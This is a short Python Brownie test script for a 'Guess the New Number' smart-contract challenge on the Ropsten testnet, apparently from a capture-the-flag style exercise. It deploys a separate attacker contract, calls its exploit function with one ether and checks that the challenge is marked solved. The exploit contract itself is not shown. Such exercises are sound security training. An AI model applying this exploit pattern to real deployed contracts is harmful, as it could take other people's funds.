from brownie import (
    accounts,
    Contract,
    GuessTheNewNumberChallenge,
    GuessTheNewNumberChallengeHacker,
)
from web3 import Web3

eth_amount = Web3.toWei("1", "ether")
challenge_contract_address = "0xF13A1c7a3500791B5414271f1A04B6A50991A88E"


def test_guess_new_number():
    # set up account and contract(s)
    account = accounts.load("Ropsten_test_net_account")
    challenge_contract = GuessTheNewNumberChallenge.at(challenge_contract_address)
    # deploy own smart contract
    hacker = GuessTheNewNumberChallengeHacker.deploy(
        challenge_contract_address, {"from": account}
    )
    print(hacker.address)
    # call exploit function in own smart contract
    tx = hacker.exploit({"from": account, "value": eth_amount})
    tx.wait(1)
    print(tx.info())
    # assert isComplete function returns true
    assert challenge_contract.isComplete()
